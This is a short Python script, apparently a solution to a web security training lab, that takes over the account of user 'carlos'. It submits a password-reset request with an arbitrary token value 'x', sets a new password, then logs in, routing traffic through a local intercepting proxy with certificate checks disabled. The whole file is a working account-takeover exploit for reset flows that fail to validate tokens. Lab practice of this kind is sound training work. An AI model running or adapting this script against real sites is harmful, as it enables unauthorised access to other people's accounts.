import requests
import sys
import urllib3

proxies = {
    "http" : "http://127.0.0.1:8080",
    "https" : "http://127.0.0.1:8080",
}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def access_carlos_account(s, url):
    print("(+) Reseting Carlos' password ..")
    password_reset_url = url + "/forgot-password?temp-forgot-password-token=x"
    password_reset_data = {
        "temp-forgot-password-token":"x",
        "username":"carlos",
        "new-password-1":"password",
        "new-password-2": "password"
    }
    
    r = s.post(password_reset_url, data=password_reset_data , proxies=proxies,verify=False)
    
    login_url = url+'/login'
    
    new_creds = {
        "username":"carlos",
        "password":"password"
    }
    login_response = s.post(login_url, data = new_creds , verify=False , proxies=proxies)
    if  "Invalid username or password." not in login_response.text :
        print("(+) Logged in as Carlos ..")
    else:
        print("(+) Something went wrong !!")

# temp-forgot-password-token=uqob3e3mqrlh4sypdpusdruhchkubi9x&username=wiener&new-password-1=sadas&new-password-2=sadasd

def main():

    if len(sys.argv) != 2 :
            print("(-) Something Went wrong !!")
            print (f"(-) Usage {sys.argv[0]} 'url' ")
            print(f"(-) Example: {sys.argv[0]} 'https://example.com' ")
            sys.exit(-1)
    session  = requests.Session()
    url = sys.argv[1]
    access_carlos_account(session, url)


if __name__ == "__main__":
    main()
